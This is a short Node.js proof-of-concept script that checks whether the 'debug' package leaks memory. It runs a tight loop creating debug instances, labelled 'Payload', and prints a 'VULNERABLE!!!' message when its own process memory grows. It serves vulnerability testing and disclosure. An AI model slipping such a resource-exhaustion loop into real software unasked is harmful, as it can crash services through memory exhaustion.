var pidusage = require('pidusage');
var process = require('process');
const debug = require('debug');

var count = 0;
var sum = 0;
var average_memory;

// Payload
const loop = () => {
  const d = debug('debug:poc')
  d('vulnerable?');
  setImmediate(loop);
};

loop();


// Show memory usage
const compute = async (time) => {
	const stats = await pidusage(process.pid);	
	process.stdout.write("\u001b[2J\u001b[0;0H"); // clear screen
	console.log('\nPOC: Checking if "debug" is vulnerable to Memory Leak.\n\n');

	if (count == 10)
	{
		average_memory = sum / 10;
	}	
	
        console.log('\nAverage memory after count of 10: %s Mb\n\n', Math.round(average_memory / 1000000));
	console.log(stats);
	count = count + 1;
	sum = sum + stats.memory;
	var diff = stats.memory - average_memory;

        if (diff > 10000000)
	{
		console.log('\n\nVULNERABLE!!!\nLeaking Aproximately: %s Gb', Math.round((((diff / 1000000000) + Number.EPSILON))* 100)/100)
	}
}


const interval = async (time) => {
  setTimeout(async () => {
    await compute();
    interval(time);
  }, time)
}

interval(1000);
